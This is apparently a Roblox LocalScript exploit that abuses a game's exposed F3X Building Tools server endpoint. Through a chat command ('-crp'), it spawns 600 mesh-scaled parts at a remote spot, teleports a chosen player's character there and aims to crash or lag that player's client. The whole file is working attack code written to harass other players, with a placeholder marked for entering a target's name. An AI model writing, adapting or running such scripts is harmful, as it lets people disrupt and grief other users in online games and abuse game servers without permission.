-- LocalScript in StarterPlayerScripts

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- FUNCTIONS 
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

function CrshPlr(Name)
    if Name == nil then
        return
    end
    local TargetPlayerName = Name  -- change this to your target
    local BaseCFrame = CFrame.new(10000, 0, 10000)
    local PartCount = 600
    local MeshId = "rbxassetid://15084089627"
    local MeshScale = Vector3.new(7, 7, 7)
    local WaitBeforeRemove = 20
    ----------------

    local TargetPlayer = Players:FindFirstChild(TargetPlayerName)
    if not TargetPlayer or not TargetPlayer.Character then
        warn("Target player not found or character not loaded")
        return
    end

    local endpoint = LocalPlayer.Character:WaitForChild("Building Tools")
        :WaitForChild("SyncAPI")
        :WaitForChild("ServerEndpoint")

    -- STEP 1: Create parts
    local createdParts = {}
    for i = 1, PartCount do
        task.spawn(function()
            local part = endpoint:InvokeServer("CreatePart", "Normal", BaseCFrame, workspace)
            if part and typeof(part) == "Instance" and part:IsA("BasePart") then
                table.insert(createdParts, part)
            end
        end)
    end

    task.wait(2) -- give server time to create parts

    -- STEP 3: Create meshes
    local meshData = {}
    for _, part in pairs(createdParts) do
        table.insert(meshData, { Part = part })
    end
    if #meshData > 0 then
        endpoint:InvokeServer("CreateMeshes", meshData)
    end

    -- STEP 4: Apply MeshId
    local meshIdData = {}
    for _, part in pairs(createdParts) do
        table.insert(meshIdData, { Part = part, MeshId = MeshId })
    end
    if #meshIdData > 0 then
        endpoint:InvokeServer("SyncMesh", meshIdData)
    end

    -- STEP 5: Scale meshes
    local scaleData = {}
    for _, part in pairs(createdParts) do
        table.insert(scaleData, { Part = part, Scale = MeshScale })
    end
    if #scaleData > 0 then
        endpoint:InvokeServer("SyncMesh", scaleData)
    end

    -- STEP 6: Move target player's character using F3X
    local char = TargetPlayer.Character
    local moveParts = {}

    -- Move main body parts
    for _, partName in ipairs({"HumanoidRootPart", "Torso", "Head", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}) do
        local part = char:FindFirstChild(partName)
        if part then
            table.insert(moveParts, { Part = part, CFrame = BaseCFrame })
        end
    end

    -- Move accessories
    for _, acc in ipairs(char:GetChildren()) do
        if acc:IsA("Accessory") and acc:FindFirstChild("Handle") then
            table.insert(moveParts, { Part = acc.Handle, CFrame = BaseCFrame })
        end
    end

    -- Move the full model using pivot
    table.insert(moveParts, { Pivot = BaseCFrame, Model = char })

    endpoint:InvokeServer("SyncMove", moveParts)

    -- STEP 7: Wait then remove parts
    task.wait(WaitBeforeRemove)
    if #createdParts > 0 then
        endpoint:InvokeServer("Remove", createdParts)
    end
end

-- MAIN CHAT STUFF

-- Command prefix
local PREFIX = "-"

-- Table of available commands
local Commands = {}

-- Example command: "example"
-- Just prints parameters to the output
Commands["crp"] = function(params)
    local plrName = params[1] -- first parameter after the command
    if not plrName then
        warn("No player name provided!")
        return
    end

    CrshPlr(plrName)

    -- just print parameters to check
    for i, v in ipairs(params) do
        print(i, v)
    end
end


-- Function to parse chat message
local function parseCommand(message)
    if message:sub(1, #PREFIX) ~= PREFIX then
        return -- Not a command
    end

    -- Remove prefix and split by spaces
    local commandLine = message:sub(#PREFIX + 1)
    local args = {}
    for word in commandLine:gmatch("%S+") do
        table.insert(args, word)
    end

    -- First argument is the command name
    local commandName = table.remove(args, 1)
    local commandFunc = Commands[commandName]

    if commandFunc then
        commandFunc(args)
    else
        print("Command not found:", commandName)
    end
end

-- Connect to player chatting
player.Chatted:Connect(parseCommand)
